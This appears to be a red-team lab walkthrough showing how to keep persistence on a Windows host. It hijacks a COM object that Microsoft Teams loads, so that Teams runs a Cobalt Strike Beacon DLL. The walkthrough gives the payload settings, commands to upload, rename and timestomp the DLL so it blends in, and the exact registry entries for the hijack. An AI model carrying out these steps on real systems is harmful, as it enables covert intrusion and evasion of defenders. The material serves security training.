# Persistence Lab

>The objective of this lab is to hijack a COM object used by Microsoft Teams to maintain persistence.

===

## Payload

1. Launch Cobalt Strike and connect to the team server.
1. Generate a DLL payload:
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **http**
    3. Output: **Windows DLL**
    4. Exit Function: **Thread**
    5. Click **Generate**.
    6. Save it to `C:\Payloads\http_x64.dll`

⚠️ Choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.

===

## COM Hijack

From the Beacon running as pchilds:

1. Change Beacon's working directory.
    
    ```sh
    cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
    ```

2. Upload the DLL payload to disk.
    1. `upload C:\Payloads\http_x64.dll`
2. Rename and timestomp the DLL to help it blend in with the existing files.
    3. `mv http_x64.dll Microsoft.Teams.HttpClient.dll`
    4. `timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll`
3. Add the registry entries to perform the COM hijack:

    ```beacon-nocolor
    reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
    reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
    ```

4. Switch to `lon-wkstn-1` and login with `Password`
5. From the Windows start menu, launch Microsoft Teams.
6. Switch back to the attacker-desktop. Select Link and a new Beacon should appear from `ms-teams.exe`

⚠️ Leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.

